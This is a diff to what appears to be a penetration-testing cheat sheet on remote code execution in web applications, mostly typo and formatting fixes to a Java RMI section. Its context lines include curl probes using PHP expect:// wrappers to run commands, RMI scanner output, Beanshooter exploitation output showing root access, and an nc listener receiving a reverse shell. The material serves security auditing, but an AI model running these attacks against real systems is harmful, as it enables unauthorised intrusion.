@@ -31,7 +31,7 @@
 - [Technique 3 - RCE using a Liferay CMS web-based groovy script console](#Technique-3-RCE-using-a-Liferay-CMS-web-based-groovy-script-console)
 - [Technique 4 - RCE by exploiting ASP.NET ViewState deserialization in .NET Web applications](#Technique-4-RCE-by-exploiting-ASPNET-ViewState-deserialization-in-NET-Web-applications)
 - [Technique 5 - RCE by exploiting PHP wrappers in PHP Web applications](#Technique-5-RCE-by-exploiting-PHP-wrappers-in-PHP-Web-applications)
-- [Technique 6 - RCE by exploiting insecure Java Remote Method Invocation APIs (Java RMI)](#Technique-6-RCE-by-exploiting-insecure-Java-Remote-Method-Invocation-API-Java-RMI)
+- [Technique 6 - RCE by exploiting insecure Java Remote Method Invocation APIs (Java RMI)](#Technique-6-RCE-by-exploiting-insecure-Java-Remote-Method-Invocation-APIs-Java-RMI)
 - Technique 7 - ...
 
 #### III. List of common paths for the DocumentRoot directory (Web root directory) [LINK](#III-List-of-common-paths-for-the-DocumentRoot-directory-Web-root-directory)
@@ -717,7 +717,7 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
            - curl --user-agent "AUDIT" "https://example.com/index.php?page=expect://whoami"
            - curl --user-agent "AUDIT" "https://example.com/?parameter=expect://whoami"
 ```
-#### Technique 6. RCE by exploiting insecure Java Remote Method Invocation API (Java RMI)
+#### Technique 6. RCE by exploiting insecure Java Remote Method Invocation APIs (Java RMI)
 <i/>Note: Insecure configuration of the Java RMI APIs used by multiple Java products could lead to unauthenticated remote code execution (RCE). Usefull links: https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi and https://swisskyrepo.github.io/PayloadsAllTheThings/Java%20RMI/</i>
 ```
 ➤ Step 1. Identify JAVA RMI APIs that are exposed on the Internet or on the internal network of the company that you are auditing.
@@ -746,6 +746,7 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	       | rmi-dumpregistry:
 	       |   jmxrmi
 	       |     javax.management.remote.rmi.RMIServerImpl_Stub
+	       <SNIP>
 
            + Example 3 - Scanning with the Java RMI vulnerability scanner "RMG" (https://github.com/qtc-de/remote-method-guesser)
              --------------------------------------------------------------------------------------------------------------------
@@ -756,6 +757,7 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	     [+]   [HIT] Found RMI service(s) on XXX.XX.XX.XX:9010  (Registry, Activator, DGC)
 	     [+]   [6234 / 6234] [#############################] 100%
 	     [+] Portscan finished.
+
 
 ➤ Step 2. Enumerate the JAVA RMI APIs and try to identify insecure default configuration and/or vulnerable APIs
 
@@ -796,7 +798,8 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	     [+]   - Security Manager rejected access to the class loader.
 	     [+]     --> The server does use a Security Manager.
 	     [+]     Configuration Status: Current Default
-	     [...]
+             <SNIP>
+
 
            + Example 2 - Enumeration/brute-force of remote methods using the Java RMI vulnerability scanner "RMG" (with the "guess" command)
              -------------------------------------------------------------------------------------------------------------------------------
@@ -828,7 +831,8 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	     [+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
 	     [+] 		--> String login(java.util.HashMap dummy1)
 
-➤ Step 3. Exploit the insecure JAVA RMI APIs identified in the previous step to remetoly execute commands (RCE)
+
+➤ Step 3. Exploit the insecure JAVA RMI APIs identified in the previous step to remotely execute commands (RCE)
 
           - Notes:
             + Multiple exploits/attacks exist depending on the configuration of the Java RMI services available.
@@ -860,6 +864,7 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
              id
              uid=0(root) gid=0(root) groups=0(root)
 
+
            + Example 2 - RCE using the tool "Beanshooter" with the "TonkaBean" command
              -------------------------------------------------------------------------
              The TonkaBean is a custom MBean that is implemented by the beanshooter project and allows file system access and
@@ -873,6 +878,8 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
              [+]
              [+] Server response:
              uid=0(root) gid=0(root) groups=0(root)
+             <SNIP>
+
 
            + Example 3 - RCE using the tool "Beanshooter" with the "standard" action/command
              -------------------------------------------------------------------------------
@@ -892,7 +899,7 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
              [+]
              [+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=3873612041699 from the MBeanServer.
              [+] 	MBean was successfully removed.
-             ...
+             <SNIP>
 
              $ nc -vlp 4444
              Ncat: Version 7.93 ( https://nmap.org/ncat )
@@ -901,6 +908,7 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
              <SNIP>
              id
              uid=0(root) gid=0(root) groups=0(root)
+
 
            + Example 3 - RCE using Metasploit
              --------------------------------
